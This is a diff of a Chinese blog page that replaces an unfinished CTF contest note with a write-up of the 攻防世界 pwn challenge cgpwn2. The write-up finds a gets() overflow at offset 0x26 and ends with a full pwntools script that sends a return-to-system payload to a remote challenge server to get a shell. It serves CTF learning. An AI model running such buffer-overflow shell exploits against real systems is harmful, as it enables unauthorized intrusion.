@@ -83,18 +83,22 @@
 
 
 
-<meta name="description" content="写在前面整场能看懂的只有第一天的基础ROP里面的题（感觉是个送的），但是其实到最后解出来的是赛区的一道防爆0题（主办方那边出错了）。">
+<meta name="description" content="cgpwn2 栈溢出ROP">
 <meta name="keywords" content="2510378776a">
 <meta property="og:type" content="article">
-<meta property="og:title" content="chessman">
-<meta property="og:url" content="http://yoursite.com/2019/06/03/New Note/index.html">
+<meta property="og:title" content="攻防世界自闭之路">
+<meta property="og:url" content="http://yoursite.com/2019/06/03/攻防世界刷题笔记/index.html">
 <meta property="og:site_name" content="chessman">
-<meta property="og:description" content="写在前面整场能看懂的只有第一天的基础ROP里面的题（感觉是个送的），但是其实到最后解出来的是赛区的一道防爆0题（主办方那边出错了）。">
+<meta property="og:description" content="cgpwn2 栈溢出ROP">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-17T12:39:57.075Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3OUQe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XrnJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/19/m3XHAI.png">
+<meta property="og:updated_time" content="2019-08-19T13:25:58.497Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="chessman">
-<meta name="twitter:description" content="写在前面整场能看懂的只有第一天的基础ROP里面的题（感觉是个送的），但是其实到最后解出来的是赛区的一道防爆0题（主办方那边出错了）。">
+<meta name="twitter:title" content="攻防世界自闭之路">
+<meta name="twitter:description" content="cgpwn2 栈溢出ROP">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/19/m3OUQe.png">
 
 
 
@@ -124,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/06/03/New Note/">
+  <link rel="canonical" href="http://yoursite.com/2019/06/03/攻防世界刷题笔记/">
 
 
 
 
 
-  <title> | chessman</title>
+  <title>攻防世界自闭之路 | chessman</title>
   
 
 
@@ -237,7 +241,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/03/New Note/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/03/攻防世界刷题笔记/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="chessman">
@@ -254,7 +258,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline"></h1>
+          <h1 class="post-title" itemprop="name headline">攻防世界自闭之路</h1>
         
 
         <div class="post-meta">
@@ -304,13 +308,15 @@
       
 
       
-        <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>整场能看懂的只有第一天的基础ROP里面的题（感觉是个送的），但是其实到最后解出来的是赛区的一道防爆0题（主办方那边出错了）。<br><a id="more"></a><br>真正觉得自己还是菜，不过也很开心了，能够去看看国赛的题目，觉得和大佬们的差距蛮大的了。最大的感触是ctf是个团队比赛，如果pwn莫得两个人在，我反正是会直接炸的。整场说过最多的话，就是没关系，大不了就凉呗（我们也晓得自己会凉）</p>
-<h1 id="break-it"><a href="#break-it" class="headerlink" title="break it"></a>break it</h1><p>break it的环节pwn爆0。</p>
-<p><front size="7" color="#FF0000"> 退赛，回家。（并没有）</front></p>
-<p>赛题难度较大，比赛时间很紧，我能做的题目并不多。我能做的只有一道基础rop的题，也就是pwn1。</p>
-<p>题目用的是libcret的只是，爆破libc_start_main的地址，我以为他能直接用gets写进去sys的地址，但是并不能，他给我东西</p>
-<p>（还没写完）</p>
-
+        <h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><blockquote>
+<p>栈溢出ROP<br><a id="more"></a></p>
+</blockquote>
+<h2 id="查看溢出点和-bin-sh"><a href="#查看溢出点和-bin-sh" class="headerlink" title="查看溢出点和/bin/sh"></a>查看溢出点和/bin/sh</h2><p>程序没有/bin/sh,通过name写入/bin/sh的位置。<br>/bin/sh的地址就为name的地址<br><img src="https://s2.ax1x.com/2019/08/19/m3OUQe.png" alt></p>
+<p>NX是打开的，所以不能利用栈，</p>
+<h2 id="查看程序伪代码"><a href="#查看程序伪代码" class="headerlink" title="查看程序伪代码"></a>查看程序伪代码</h2><p><img src="https://s2.ax1x.com/2019/08/19/m3XrnJ.png" alt></p>
+<p>能够利用的gets为name和s两个值。通过<br><img src="https://s2.ax1x.com/2019/08/19/m3XHAI.png" alt></p>
+<p>可知s的偏移地址为0x26<br>由此可得<code>payload = 0x26位填充s变量 + 0x4位覆盖EBP + system()函数地址 + 0x4位任意返回地址 + name常量地址</code>写出exp</p>
+<h2 id="完整的exp脚本为"><a href="#完整的exp脚本为" class="headerlink" title="完整的exp脚本为"></a>完整的exp脚本为</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">"111.198.29.45"</span>,<span class="number">46049</span>)</span><br><span class="line"></span><br><span class="line">shadd = <span class="number">0x0804A080</span></span><br><span class="line">sys = <span class="number">0x08048420</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x26</span>*<span class="string">'a'</span>+<span class="number">0x04</span>*<span class="string">'a'</span>+p32(sys)+<span class="string">'a'</span>*<span class="number">0x04</span>+p32(shadd)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"\n"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"\n"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -456,7 +462,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#break-it"><span class="nav-number">2.</span> <span class="nav-text">break it</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cgpwn2"><span class="nav-number">1.</span> <span class="nav-text">cgpwn2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查看溢出点和-bin-sh"><span class="nav-number">1.1.</span> <span class="nav-text">查看溢出点和/bin/sh</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看程序伪代码"><span class="nav-number">1.2.</span> <span class="nav-text">查看程序伪代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整的exp脚本为"><span class="nav-number">1.3.</span> <span class="nav-text">完整的exp脚本为</span></a></li></ol></li></ol></div>
             
 
           </div>
